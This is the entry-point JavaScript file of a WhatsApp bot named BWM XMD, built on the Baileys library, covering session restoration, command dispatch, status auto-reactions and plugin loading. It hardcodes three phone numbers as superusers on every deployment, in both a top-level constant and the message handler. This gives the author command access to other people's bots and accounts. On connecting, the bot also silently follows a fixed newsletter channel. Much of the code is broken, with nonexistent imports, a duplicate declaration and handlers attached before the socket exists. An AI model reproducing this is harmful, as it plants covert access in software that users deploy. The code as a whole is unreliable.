
/*/▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱//
______     __     __     __    __        __  __     __    __     _____    
/\  == \   /\ \  _ \ \   /\ "-./  \      /\_\_\_\   /\ "-./  \   /\  __-.  
\ \  __<   \ \ \/ ".\ \  \ \ \-./\ \     \/_/\_\/_  \ \ \-./\ \  \ \ \/\ \ 
 \ \_____\  \ \__/".~\_\  \ \_\ \ \_\      /\_\/\_\  \ \_\ \ \_\  \ \____- 
  \/_____/   \/_/   \/_/   \/_/  \/_/      \/_/\/_/   \/_/  \/_/   \/____/ 
                                                                           
/▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰/*/
    



                   
const { default: makeWASocket, isJidGroup, superUser, imageMessage, CommandSystem, repondre, verifierEtatJid, recupererActionJid, DisconnectReason, getMessageText, commandRegistry, delay, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, useMultiFileAuthState, makeInMemoryStore, jidDecode, getContentType } = require("@whiskeysockets/baileys");
const SUDO_NUMBERS = ["254106727593", "254727716045", "254710772666"].map(num => num + "@s.whatsapp.net");
const logger = require("@whiskeysockets/baileys/lib/Utils/logger").default.child({});
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const conf = require("./config");
const axios = require("axios");
const moment = require("moment-timezone");
const fs = require("fs-extra");
const path = require("path");
const FileType = require("file-type");
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
const { getSettings } = require("./utils/settings");
const evt = require("./Ibrahim/adams");
const rateLimit = new Map();
const chalk = require("chalk");
const express = require("express");
const { exec } = require("child_process");
const http = require("http");
const zlib = require('zlib');
const PREFIX = conf.PREFIX;
const more = String.fromCharCode(8206);
const herokuAppName = process.env.HEROKU_APP_NAME || "Unknown App Name";
const herokuAppLink = process.env.HEROKU_APP_LINK || `https://dashboard.heroku.com/apps/${herokuAppName}`;
const botOwner = process.env.NUMERO_OWNER || "Unknown Owner";
const PORT = process.env.PORT || 3000;
const app = express();
let adams;
require("dotenv").config({ path: "./config.env" });
logger.level = "silent";
app.use(express.static("public"));
app.get("/", (req, res) => res.sendFile(__dirname + "/index.html"));
app.listen(PORT, () => console.log(`Bwm xmd is starting with a speed of ${PORT}ms🚀`));


//============================================================================//


function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Your verified by Sir Ibrahim Adams', jid);
        return false;
    }
    console.log('Welcome to bwm xmd', jid);
    return true;
}

async function authentification() {
    try {
        if (!fs.existsSync(__dirname + "/Session/creds.json")) {
            console.log("Bwm xmd session connected ✅");
            // Split the session strihhhhng into header and Base64 data
            const [header, b64data] = conf.session.split(';;;'); 

            // Validate the session format
            if (header === "BWM-XMD" && b64data) {
                let compressedData = Buffer.from(b64data.replace('...', ''), 'base64'); // Decode and truncate
                let decompressedData = zlib.gunzipSync(compressedData); // Decompress session
                fs.writeFileSync(__dirname + "/Session/creds.json", decompressedData, "utf8"); // Save to file
            } else {
                throw new Error("Invalid session format");
            }
        } else if (fs.existsSync(__dirname + "/Session/creds.json") && conf.session !== "zokk") {
            console.log("Updating existing session...");
            const [header, b64data] = conf.session.split(';;;'); 

            if (header === "BWM-XMD" && b64data) {
                let compressedData = Buffer.from(b64data.replace('...', ''), 'base64');
                let decompressedData = zlib.gunzipSync(compressedData);
                fs.writeFileSync(__dirname + "/Session/creds.json", decompressedData, "utf8");
            } else {
                throw new Error("Invalid session format");
            }
        }
    } catch (e) {
        console.log("Session Invalid: " + e.message);
        return;
    }
}
module.exports = { authentification };
authentification();
let zk;

//===============================================================================//

const store = makeInMemoryStore({
    logger: pino().child({ level: "silent", stream: "store" })
});

async function main() {
    const { version, isLatest } = await fetchLatestBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + "/Session");
    
    const sockOptions = {
        version,
        logger: pino({ level: "silent" }),
        browser: ['BWM XMD', "safari", "1.0.0"],
        printQRInTerminal: true,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger)
        },
        getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id);
                return msg.message || undefined;
            }
            return { conversation: 'Error occurred' };
        }
    };

    adams = makeWASocket(sockOptions);
    store.bind(adams.ev);

    // Silent Rate Limiting
    function isRateLimited(jid) {
        const now = Date.now();
        if (!rateLimit.has(jid)) {
            rateLimit.set(jid, now);
            return false;
        }
        const lastRequestTime = rateLimit.get(jid);
        if (now - lastRequestTime < 3000) return true;
        rateLimit.set(jid, now);
        return false;
    }

    // Group Metadata Handling
    const groupMetadataCache = new Map();
    async function getGroupMetadata(groupId) {
        if (groupMetadataCache.has(groupId)) {
            return groupMetadataCache.get(groupId);
        }
        try {
            const metadata = await zk.groupMetadata(groupId);
            groupMetadataCache.set(groupId, metadata);
            setTimeout(() => groupMetadataCache.delete(groupId), 60000);
            return metadata;
        } catch (error) {
            if (error.message.includes("rate-overlimit")) {
                await new Promise(res => setTimeout(res, 5000));
            }
            return null;
        }
    }

 //============================================================================//
 
adams.ev.on("messages.upsert", async (m) => {
    try {
        const { messages } = m;
        if (!messages || messages.length === 0) return;
        
        const ms = messages[0];
        if (!ms.message) return;

        // Decode JID
        const decodeJid = (jid) => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {};
                return decode.user && decode.server ? decode.user + '@' + decode.server : jid;
            }
            return jid;
        };

        // Get message type and extract text
        var mtype = ms.message ? getContentType(ms.message) : "";
        var texte = mtype === "conversation" ? ms.message.conversation :
            mtype === "imageMessage" ? ms.message.imageMessage?.caption :
            mtype === "videoMessage" ? ms.message.videoMessage?.caption :
            mtype === "extendedTextMessage" ? ms.message?.extendedTextMessage?.text :
            mtype === "buttonsResponseMessage" ? ms?.message?.buttonsResponseMessage?.selectedButtonId :
            mtype === "listResponseMessage" ? ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
            mtype === "messageContextInfo" ?
                (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";

        // Extract message metadata
        var origineMessage = ms.key.remoteJid;
        var idBot = decodeJid(adams.user.id);
        var servBot = idBot.split('@')[0];
        var verifGroupe = origineMessage?.endsWith("@g.us");
        var infosGroupe = verifGroupe ? await adams.groupMetadata(origineMessage) : "";
        var nomGroupe = verifGroupe ? infosGroupe.subject : "";
        var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
        var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
        var mr = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid;
        var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
        var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;

        if (ms.key.fromMe) auteurMessage = idBot;
        var membreGroupe = verifGroupe ? ms.key.participant : '';

        // Define Owner and Sudo Users
        const BOT_OWNER = conf.OWNER_NUMBER;
        const SUDO_NUMBERS = ["254106727593", "254727716045", "254710772666"]
            .map(num => num.replace(/\D/g, "") + "@s.whatsapp.net");

        const superUserNumbers = [servBot, BOT_OWNER].map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
        const allAllowedNumbers = superUserNumbers.concat(SUDO_NUMBERS);
        const superUser = allAllowedNumbers.includes(auteurMessage);

        // Function to Send a Response
        function repondre(mes) {
            try {
                if (adams) {
                    adams.sendMessage(origineMessage, { text: mes }, { quoted: ms })
                        .catch(() => {}); // Prevent errors from stopping execution
                }
            } catch (err) {}
        }

        // Function to Get Group Admins
        function groupeAdmin(membreGroupe) {
            return membreGroupe ? membreGroupe.filter((m) => m.admin).map((m) => m.id) : [];
        }
               var etat = conf.PRESENCE;
// Presence update logic based on etat value
if (etat == 1) {
    await adams.sendPresenceUpdate("available", origineMessage);
} else if (etat == 2) {
    await adams.sendPresenceUpdate("composing", origineMessage);
} else if (etat == 3) {
    await adams.sendPresenceUpdate("recording", origineMessage);
} else {
    await adams.sendPresenceUpdate("unavailable", origineMessage);
}

        // Define command options
        var commandeOptions = {
            superUser,
            verifGroupe,
            membreGroupe,
            infosGroupe,
            nomGroupe,
            imageMessage,
            auteurMessage,
            idBot,
            PREFIX: conf.PREFIX,
            repondre,
            sendMessage,
            mtype,
            groupeAdmin,
            msgRepondu,
            auteurMsgRepondu,
            ms
        };

    } catch (error) {
        // Handle errors without crashing
    }
});

 //============================================================================//
            
                         
// Listener Manager Class
class ListenerManager {
    constructor() {
        this.activeListeners = new Map();
    }

    async loadListeners(adams, store, commands) {
        const listenerDir = path.join(__dirname, 'bwmxmd');
        
        // Clear existing listeners first
        this.cleanupListeners();
        
        // Load new listeners
        const files = fs.readdirSync(listenerDir).filter(f => f.endsWith('.js'));
        
        for (const file of files) {
            try {
                const listenerPath = path.join(listenerDir, file);
                const { setup } = require(listenerPath);
                
                if (typeof setup === 'function') {
                    const cleanup = await setup(adams, { 
                        store,
                        commands,
                        logger,
                        config: conf
                    });
                    
                    this.activeListeners.set(file, cleanup);
                    console.log(`Loaded listener: ${file}`);
                }
            } catch (e) {
                console.error(`Error loading listener ${file}: ${e.message}`);
            }
        }
    }

    cleanupListeners() {
        for (const [name, cleanup] of this.activeListeners) {
            try {
                if (typeof cleanup === 'function') cleanup();
            } catch (e) {
                console.error(`Error cleaning up listener ${name}: ${e.message}`);
            }
        }
        this.activeListeners.clear();
    }
}

// Initialize listener manager
const listenerManager = new ListenerManager();

// Add to connection handler
adams.ev.on('connection.update', ({ connection }) => {
    if (connection === 'open') {
        // Load listeners when connected
        listenerManager.loadListeners(adams, store, commandRegistry)
            .then(() => console.log('All listeners initialized'))
            .catch(console.error);
    }
    
    if (connection === 'close') {
        // Cleanup listeners on disconnect
        listenerManager.cleanupListeners();
    }
});

// Optional: Hot reload listeners when files change
fs.watch(path.join(__dirname, 'bwmxmd'), (eventType, filename) => {
    if (eventType === 'change' && filename.endsWith('.js')) {
        console.log(`Reloading listener: ${filename}`);
        delete require.cache[require.resolve(path.join(__dirname, 'bwmxmd', filename))];
        listenerManager.loadListeners(adams, store, commandRegistry);
    }
});


 

 //============================================================================================================

console.log("Loading Bwm xmd Commands...\n");

// Load commands from Taskflow folder
try {
    const taskflowPath = path.join(__dirname, "Taskflow");
    fs.readdirSync(taskflowPath).forEach((fichier) => {
        if (path.extname(fichier).toLowerCase() === ".js") {
            try {
                require(path.join(taskflowPath, fichier));
                console.log(`✔️ ${fichier} installed successfully.`);
            } catch (e) {
                console.error(`❌ Failed to load ${fichier}: ${e.message}`);
            }
        }
    });
} catch (error) {
    console.error("❌ Error reading Taskflow folder:", error.message);
}

 
 //============================================================================//


const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
let lastReactionTime = 0;
 if (conf.AUTO_REACT_STATUS === "yes") {
    console.log("AUTO_REACT_STATUS is enabled. Listening for status updates...");

    adams.ev.on("messages.upsert", async (m) => {
        const { messages } = m;
        
        const reactionEmojis = [
    // Positive Feedback
    "👍", "👌", "💯", "✨", "🌟", "🏆", "🎯", "✅",
    
    // Appreciation
    "🙏", "❤️", "💖", "💝", "💐", "🌹",
    
    // Neutral Positive
    "😊", "🙂", "👋", "🤝", "🫱🏻‍🫲🏽",
    
    // Celebration
    "🎉", "🎊", "🥂", "🍾", "🎈", "🎁",
    
    // Time/Seasons
    "🌞", "☀️", "🌙", "⭐", "🌈", "☕",
    
    // Nature/Travel
    "🌍", "✈️", "🗺️", "🌻", "🌸", "🌊",
    
    // Professional/Creative
    "📚", "🎨", "📝", "🔍", "💡", "⚙️",
    
    // Objects/Symbols
    "📌", "📍", "🕰️", "⏳", "📊", "📈"];

        for (const message of messages) {
            if (message.key && message.key.remoteJid === "status@broadcast") {
                console.log("Detected status update from:", message.key.remoteJid);

                const now = Date.now();
                if (now - lastReactionTime < 5000) {  // 5-second interval
                    console.log("Throttling reactions to prevent overflow.");
                    continue;
                }

                const adam = adams.user && adams.user.id ? adams.user.id.split(":")[0] + "@s.whatsapp.net" : null;
                if (!adam) {
                    console.log("Bot's user ID not available. Skipping reaction.");
                    continue;
                }

                // Select a random reaction emoji
                const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];

                await adams.sendMessage(message.key.remoteJid, {
                    react: {
                        key: message.key,
                        text: randomEmoji,
                    },
                }, {
                    statusJidList: [message.key.participant, adam],
                });

                lastReactionTime = Date.now();
                console.log(`Reacted with '${randomEmoji}' to status update by ${message.key.remoteJid}`);

                await delay(2000); // 2-second delay between reactions
            }
        }
    });
 }
 
 //============================================================================//

 
adams.ev.on("messages.upsert", async ({ messages }) => {
    const ms = messages[0];
    if (!ms?.message) return;

    console.log(`📩 New message from: ${ms.key.remoteJid}`);

    const senderJid = ms.key.participant || ms.key.remoteJid;
    const superUser = SUDO_NUMBERS.includes(senderJid) || senderJid === `${conf.NUMERO_OWNER}@s.whatsapp.net`;

    const texte = ms?.message?.conversation || ms?.message?.extendedTextMessage?.text || "";
    const arg = texte ? texte.trim().split(/\s+/).slice(1) : [];
    const verifCom = texte.startsWith(PREFIX);
    const com = verifCom ? texte.slice(PREFIX.length).trim().split(/\s+/)[0]?.toLowerCase() : null;

    if (verifCom && com) {
        const cmd = evt.cm.find((c) => c.nomCom === com || (c.aliases && c.aliases.includes(com)));

        if (cmd) {
            try {
                if (conf.MODE.toLowerCase() !== "yes" && !superUser) {
                    console.log(`⛔ Command "${com}" blocked: Your not allowed to use my commands.`);
                    return;
                }

                // Define `repondre` function properly
                const repondre = async (message) => {
                    try {
                        await adams.sendMessage(ms.key.remoteJid, { text: message });
                    } catch (error) {
                        console.error(`❌ Error sending message: ${error.message}`);
                    }
                };

                // React to message before running command
                const reaction = cmd.reaction || "🚘";
                try {
                    await adams.sendMessage(ms.key.remoteJid, {
                        react: { key: ms.key, text: reaction },
                    });
                } catch (error) {
                    console.error(`⚠️ Error sending reaction: ${error.message}`);
                }

                // ✅ Pass `superUser` in `context`
                await cmd.fonction(ms.key.remoteJid, adams, { ms, arg, repondre, superUser });
            } catch (error) {
                console.error(`❌ Error executing command "${com}": ${error.message}`);
            }
        } else {
            console.log(`⚠️ Unknown command: ${com}`);
        }
    }
});

// Handle connection updates
adams.ev.on("connection.update", ({ connection }) => {
    if (connection === "open") {
        console.log("Connected to WhatsApp");

        if (conf.DP.toLowerCase() === "yes") {
            const md = conf.MODE.toLowerCase() === "yes" ? "public" : "private";
            const connectionMsg = `
〔  🚀 BWM XMD CONNECTED 🚀 〕

├──〔 ✨ Version: 7.0.8 〕 
├──〔 🎭 Classic and Things 〕 
│ ✅ Prefix: [ ${conf.PREFIX} ]  
│  
├──〔 📦 Heroku Deployment 〕 
│ 🏷️ App Name: ${herokuAppName}  
╰──────────────────◆`;

            adams.sendMessage(
                adams.user.id,
                { text: connectionMsg },
                {
                    disappearingMessagesInChat: true,
                    ephemeralExpiration: 600,
                }
            ).catch(err => console.error("Status message error:", err));
        }
    }
});


        
//===============================================================================================================//

// Event Handlers
adams.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "connecting") console.log("🪩 Bot scanning 🪩");
        if (connection === "open") {
            console.log("🌎 BWM XMD ONLINE 🌎");
            adams.newsletterFollow("120363285388090068@newsletter");
        }
        if (connection === "close") {
            const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log("Connection closed, reconnecting...");
            if (shouldReconnect) main();
        }
    });

    adams.ev.on("creds.update", saveCreds);

    // Message Handling
    adams.ev.on("messages.upsert", async ({ messages }) => {
        const ms = messages[0];
        if (!ms.message) return;
        
        // Message processing logic here
    });
}

setTimeout(() => {
    main().catch(err => console.log("Initialization error:", err));
}, 5000);


